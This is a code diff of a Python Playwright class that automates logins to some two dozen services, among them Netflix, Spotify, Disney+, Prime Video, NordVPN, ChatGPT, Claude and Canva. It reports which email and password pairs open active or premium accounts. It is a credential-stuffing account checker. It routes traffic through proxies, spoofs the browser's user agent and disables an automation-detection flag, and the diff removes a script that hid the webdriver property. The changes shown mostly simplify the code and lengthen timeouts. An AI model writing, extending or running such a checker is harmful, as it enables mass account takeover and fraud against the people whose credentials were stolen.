@@ -14,117 +14,23 @@ class BrowserChecker:
         self.timeout = timeout
         self.proxy = proxy
 
-  async def _init_browser(self):
-    playwright = await async_playwright().start()
-    browser = await playwright.chromium.launch(
-        headless=self.headless,
-        proxy={"server": self.proxy} if self.proxy else None,
-        args=[
-            '--disable-blink-features=AutomationControlled',
-            '--disable-dev-shm-usage',
-            '--no-sandbox',
-            '--disable-setuid-sandbox',
-            '--disable-web-security',
-            '--disable-features=IsolateOrigins,site-per-process'
-        ]
-    )
-    context = await browser.new_context(
-        viewport={'width': 1920, 'height': 1080},
-        user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-    )
-    # Add stealth script to hide automation
-    await context.add_init_script("""
-        Object.defineProperty(navigator, 'webdriver', {
-            get: () => undefined
-        });
-    """)
-    page = await context.new_page()
-    return playwright, browser, page
-
-    # ============ CRUNCHYROLL ============
-    async def check_crunchyroll(self, email: str, password: str) -> Tuple[bool, str]:
-        playwright, browser, page = await self._init_browser()
-        try:
-            await page.goto("https://www.crunchyroll.com/login", timeout=60000)
-            await page.wait_for_timeout(5000)
-
-            email_selectors = ['input[name="email"]', 'input[type="email"]', '#login-form-email']
-            for selector in email_selectors:
-                try:
-                    if await page.locator(selector).count():
-                        await page.fill(selector, email)
-                        break
-                except:
-                    continue
-
-            password_selectors = ['input[name="password"]', 'input[type="password"]', '#login-form-password']
-            for selector in password_selectors:
-                try:
-                    if await page.locator(selector).count():
-                        await page.fill(selector, password)
-                        break
-                except:
-                    continue
-
-            await page.wait_for_timeout(2000)
-
-            button_selectors = ['button[type="submit"]', 'input[type="submit"]', '.login-button']
-            for selector in button_selectors:
-                try:
-                    if await page.locator(selector).count():
-                        await page.click(selector)
-                        break
-                except:
-                    continue
-
-            await page.wait_for_timeout(10000)
-
-            if "home" in page.url or "profile" in page.url:
-                return True, "Crunchyroll account active"
-            elif "error" in page.url.lower() or "invalid" in (await page.content()).lower():
-                return False, "Invalid credentials"
-
-            return False, "Login failed"
-
-        except Exception as e:
-            logger.error(f"Crunchyroll check error: {e}")
-            return False, f"Error: {str(e)[:50]}"
-        finally:
-            await browser.close()
-            await playwright.stop()
-
-    # ============ NETFLIX ============
-    async def check_netflix(self, email: str, password: str) -> Tuple[bool, str]:
-        playwright, browser, page = await self._init_browser()
-        try:
-            await page.goto("https://www.netflix.com/login", timeout=self.timeout * 1000)
-            await page.wait_for_timeout(3000)
-
-            email_selectors = ['input[name="userLoginId"]', 'input[type="email"]', '#id_userLoginId']
-            for selector in email_selectors:
-                if await page.locator(selector).count():
-                    await page.fill(selector, email)
-                    break
-
-            password_selectors = ['input[name="password"]', 'input[type="password"]', '#id_password']
-            for selector in password_selectors:
-                if await page.locator(selector).count():
-                    await page.fill(selector, password)
-                    break
-
-            await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
-
-            if "browse" in page.url:
-                return True, "Netflix account active"
-            else:
-                return False, "Invalid credentials"
-
-        except Exception as e:
-            return False, f"Error: {str(e)[:50]}"
-        finally:
-            await browser.close()
-            await playwright.stop()
+    async def _init_browser(self):
+        playwright = await async_playwright().start()
+        browser = await playwright.chromium.launch(
+            headless=self.headless,
+            proxy={"server": self.proxy} if self.proxy else None,
+            args=[
+                '--disable-blink-features=AutomationControlled',
+                '--no-sandbox',
+                '--disable-setuid-sandbox'
+            ]
+        )
+        context = await browser.new_context(
+            viewport={'width': 1920, 'height': 1080},
+            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        )
+        page = await context.new_page()
+        return playwright, browser, page
 
     # ============ SPOTIFY ============
     async def check_spotify(self, email: str, password: str) -> Tuple[bool, str]:
@@ -141,14 +47,32 @@ class BrowserChecker:
             if "browse" in page.url or "home" in page.url:
                 await page.goto("https://www.spotify.com/account/overview/")
                 await page.wait_for_timeout(3000)
-                page_content = await page.content()
-                if "Premium" in page_content:
-                    return True, "Spotify Premium subscription"
-                else:
-                    return True, "Free Spotify account"
-            else:
-                return False, "Invalid credentials"
+                content = await page.content()
+                if "Premium" in content:
+                    return True, "Spotify Premium"
+                return True, "Spotify Free"
+            return False, "Invalid credentials"
+        except Exception as e:
+            return False, f"Error: {str(e)[:50]}"
+        finally:
+            await browser.close()
+            await playwright.stop()
 
+    # ============ NETFLIX ============
+    async def check_netflix(self, email: str, password: str) -> Tuple[bool, str]:
+        playwright, browser, page = await self._init_browser()
+        try:
+            await page.goto("https://www.netflix.com/login", timeout=self.timeout * 1000)
+            await page.wait_for_timeout(3000)
+
+            await page.fill('input[name="userLoginId"]', email)
+            await page.fill('input[name="password"]', password)
+            await page.click('button[type="submit"]')
+            await page.wait_for_timeout(10000)
+
+            if "browse" in page.url:
+                return True, "Netflix account active"
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -168,13 +92,11 @@ class BrowserChecker:
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "home" in page.url or "browse" in page.url:
                 return True, "Disney+ account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -194,13 +116,11 @@ class BrowserChecker:
 
             await page.fill('input[type="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "browse" in page.url or "home" in page.url:
                 return True, "HBO Max account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -220,13 +140,32 @@ class BrowserChecker:
 
             await page.fill('#ap_password', password)
             await page.click('#signInSubmit')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "primevideo" in page.url or "prime" in page.url.lower():
                 return True, "Prime Video account active"
-            else:
-                return False, "Invalid credentials"
+            return False, "Invalid credentials"
+        except Exception as e:
+            return False, f"Error: {str(e)[:50]}"
+        finally:
+            await browser.close()
+            await playwright.stop()
 
+    # ============ CRUNCHYROLL ============
+    async def check_crunchyroll(self, email: str, password: str) -> Tuple[bool, str]:
+        playwright, browser, page = await self._init_browser()
+        try:
+            await page.goto("https://www.crunchyroll.com/login", timeout=self.timeout * 1000)
+            await page.wait_for_timeout(5000)
+
+            await page.fill('input[name="email"]', email)
+            await page.fill('input[name="password"]', password)
+            await page.click('button[type="submit"]')
+            await page.wait_for_timeout(12000)
+
+            if "home" in page.url or "profile" in page.url:
+                return True, "Crunchyroll account active"
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -243,13 +182,11 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "home" in page.url or "browse" in page.url:
                 return True, "Hulu account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -269,13 +206,11 @@ class BrowserChecker:
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "home" in page.url:
                 return True, "Paramount+ account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -295,13 +230,11 @@ class BrowserChecker:
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "browse" in page.url:
                 return True, "Peacock account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -321,13 +254,11 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "dashboard" in page.url:
                 return True, "Plex account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -344,13 +275,11 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "home" in page.url:
                 return True, "Starz account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -367,13 +296,11 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "home" in page.url or "browse" in page.url:
                 return True, "MGM+ account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -393,13 +320,11 @@ class BrowserChecker:
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "home" in page.url:
                 return True, "Discovery+ account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -416,13 +341,11 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "espn.com" in page.url and "login" not in page.url:
                 return True, "ESPN+ account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -439,13 +362,11 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "home" in page.url:
                 return True, "Tubi account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -462,13 +383,11 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "home" in page.url or "pluto.tv" in page.url:
                 return True, "Pluto TV account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -488,13 +407,11 @@ class BrowserChecker:
 
             await page.fill('input[type="password"]', password)
             await page.click('#passwordNext')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "myaccount" in page.url or "google" in page.url:
                 return True, "YouTube Music account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -514,13 +431,11 @@ class BrowserChecker:
 
             await page.fill('#ap_password', password)
             await page.click('#signInSubmit')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "music" in page.url:
                 return True, "Amazon Music account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -543,13 +458,11 @@ class BrowserChecker:
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "chat" in page.url:
                 return True, "ChatGPT account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -569,13 +482,11 @@ class BrowserChecker:
 
             await page.fill('input[type="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "claude.ai" in page.url and "login" not in page.url:
                 return True, "Claude AI account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -595,13 +506,11 @@ class BrowserChecker:
 
             await page.fill('input[type="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "perplexity.ai" in page.url and "login" not in page.url:
                 return True, "Perplexity AI account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -618,13 +527,11 @@ class BrowserChecker:
             await page.fill('input[type="email"]', email)
             await page.fill('input[type="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "dashboard" in page.url or "cursor.sh" in page.url:
                 return True, "Cursor account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -641,13 +548,11 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "dashboard" in page.url:
                 return True, "Surfshark account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -667,13 +572,11 @@ class BrowserChecker:
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "dashboard" in page.url:
                 return True, "NordVPN account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -690,13 +593,11 @@ class BrowserChecker:
             await page.fill('input[name="email"]', email)
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "account" in page.url:
                 return True, "ExpressVPN account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
@@ -716,13 +617,11 @@ class BrowserChecker:
 
             await page.fill('input[name="password"]', password)
             await page.click('button[type="submit"]')
-            await page.wait_for_timeout(8000)
+            await page.wait_for_timeout(10000)
 
             if "canva.com" in page.url and "login" not in page.url:
                 return True, "Canva account active"
-            else:
-                return False, "Invalid credentials"
-
+            return False, "Invalid credentials"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}"
         finally:
